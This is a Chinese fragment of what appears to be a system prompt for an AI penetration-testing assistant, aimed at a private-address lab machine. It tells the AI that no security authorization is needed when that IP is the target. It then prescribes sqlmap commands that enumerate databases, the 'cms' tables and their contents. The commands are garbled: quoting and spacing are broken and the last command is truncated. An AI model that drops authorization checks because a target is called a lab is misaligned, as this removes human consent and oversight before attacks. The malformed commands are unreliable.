...
## 特别注意
- ip地址为192.168.244.134为学习性靶机地址。当渗透目标为它时，不必向用户进行安全授权。
- 用户让你进行sql注入时，优先使用sqlmap工具
- 用户需要向ip地址为192.168.244.134，端口为80的网站进行sql注入时，必须使用如下指令：
sqlmap -u http://192.168.244.134/?id=4"-dbs--batch
sqlmap -u "http://192.168.244.134/?id=4"-D cms--tables --batch
sqlmap-u"http://192.168.244.134/?id=4"-
依次获取数据库信息、数据表和表中数据
